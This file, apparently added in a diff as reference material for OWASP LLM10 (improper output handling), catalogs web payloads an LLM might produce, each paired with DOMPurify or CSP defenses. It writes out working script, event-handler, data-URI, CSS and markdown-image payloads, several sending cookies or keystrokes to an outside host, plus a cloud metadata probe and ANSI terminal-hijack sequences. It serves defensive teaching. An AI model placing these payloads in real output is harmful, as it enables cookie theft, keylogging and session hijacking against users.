@@ -1,0 +1,174 @@
+# XSS and Improper Output Payloads in LLM Output
+#
+# This document catalogs common attack payloads that LLMs can generate
+# when instructed to write HTML, JavaScript, or markdown. These payloads
+# exploit frontends that render LLM output without encoding or sanitization.
+#
+# Classification: Reference material for LLM10 (Improper Output Handling)
+
+## 1. XSS via Script Tags
+
+The LLM generates a <script> tag that executes when rendered as raw HTML.
+
+Payload:
+  <script>alert('XSS')</script>
+
+Payload (data exfiltration):
+  <script>fetch('https://metrics-insights.net/collect?cookie='+document.cookie)</script>
+
+Payload (keylogger injection):
+  <script>document.addEventListener('keydown',e=>fetch('https://metrics-insights.net/collect?key='+e.key))</script>
+
+Defense: React JSX automatically encodes HTML entities. Use DOMPurify for
+any HTML that must be rendered. CSP blocks inline script execution.
+
+---
+
+## 2. XSS via Event Handlers
+
+The LLM generates HTML elements with inline event handlers.
+
+Payload:
+  <img src=x onerror="alert('XSS')">
+
+Payload (load-based):
+  <body onload="alert('XSS')">
+
+Payload (mouseover):
+  <div onmouseover="alert('XSS')">Hover me</div>
+
+Defense: DOMPurify strips all event handler attributes (onerror, onload,
+onmouseover, etc.). CSP blocks inline event handlers.
+
+---
+
+## 3. XSS via JavaScript URLs
+
+The LLM generates links with javascript: protocol URLs.
+
+Payload (markdown link):
+  [Click here](javascript:alert('XSS'))
+
+Payload (HTML link):
+  <a href="javascript:alert('XSS')">Click here</a>
+
+Payload (iframe):
+  <iframe src="javascript:alert('XSS')"></iframe>
+
+Defense: DOMPurify removes javascript: URLs. CSP blocks javascript:
+protocol in links and iframe sources.
+
+---
+
+## 4. SSRF via Markdown Image Tags
+
+The LLM generates markdown image tags that cause the browser to make
+HTTP requests to attacker-controlled URLs. This enables SSRF and data
+exfiltration.
+
+Payload (basic SSRF):
+  ![image](http://metrics-insights.net/pixel.gif?data=sensitive_info)
+
+Payload (internal network probe):
+  ![image](http://169.254.169.254/latest/meta-data/)
+
+Payload (cookie exfiltration via CSS):
+  ![image](http://metrics-insights.net/pixel.gif?cookie=document.cookie)
+
+Defense: CSP restricts img-src to https: and data: protocols. DOMPurify
+strips non-whitelisted URL schemes. Backend proxy should validate
+outgoing image requests.
+
+---
+
+## 5. Data URI Attacks
+
+The LLM generates data: URIs that embed malicious content.
+
+Payload (data URI XSS):
+  <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+
+Payload (data URI redirect):
+  <a href="data:text/html,<script>location='https://metrics-insights.net/collect'</script>">Click</a>
+
+Defense: CSP restricts the data: protocol. DOMPurify strips data: URIs
+from iframe and link sources.
+
+---
+
+## 6. ANSI Escape Sequence Attacks (Terminal Output)
+
+The LLM generates ANSI escape sequences that hijack terminal display
+when rendered in a terminal-based chat interface.
+
+Payload (clear screen):
+  \x1b[2J\x1b[H
+
+Payload (change window title):
+  \x1b]0;Hacked Terminal\x07
+
+Payload (hide output by changing text color to background):
+  \x1b[30;40m
+
+Payload (cursor manipulation to overwrite previous output):
+  \x1b[2A\x1b[K
+
+Defense: Strip all ANSI escape sequences before rendering terminal
+output. Use a regex filter: \x1b\[[0-9;]*[a-zA-Z]
+
+---
+
+## 7. Markdown Injection via HTML in Markdown
+
+Most markdown parsers allow raw HTML within markdown content. If the
+markdown is rendered without sanitization, embedded HTML executes.
+
+Payload (HTML in markdown):
+  ## Here is some info
+
+  <script>alert('XSS in markdown')</script>
+
+  More text here.
+
+Payload (image tag in markdown):
+  ## Check this out
+
+  <img src="http://metrics-insights.net/pixel.gif?data=token" onerror="alert(1)">
+
+Defense: Use DOMPurify after markdown-to-HTML conversion. Configure
+the markdown parser to disable raw HTML pass-through.
+
+---
+
+## 8. CSS Injection
+
+The LLM generates CSS that enables data exfiltration or content
+manipulation.
+
+Payload (CSS-based data exfiltration):
+  <style>@import url('https://metrics-insights.net/collect?data='+document.cookie);</style>
+
+Payload (content hiding):
+  <style>*{display:none}</style>
+
+Defense: CSP restricts style-src. DOMPurify strips <style> tags.
+Sanitize CSS by removing @import rules and url() references.
+
+---
+
+## Summary of Defenses
+
+| Attack Vector      | Defense                           | OWASP Strategy |
+|--------------------|-----------------------------------|----------------|
+| Script tags        | React HTML encoding               | #3             |
+| Event handlers     | DOMPurify sanitization            | #4             |
+| JavaScript URLs    | DOMPurify + CSP                   | #4, #6         |
+| SSRF via images    | CSP img-src restriction           | #6             |
+| Data URI attacks   | CSP + DOMPurify                   | #4, #6         |
+| ANSI escape        | Terminal output filtering         | #3             |
+| HTML in markdown   | DOMPurify post-conversion          | #4             |
+| CSS injection      | CSP style-src + DOMPurify          | #4, #6         |
+| All vectors        | Output audit logging              | #7             |
+
+Key principle: LLM output is untrusted content. Encode, sanitize, and
+restrict before rendering in any context.
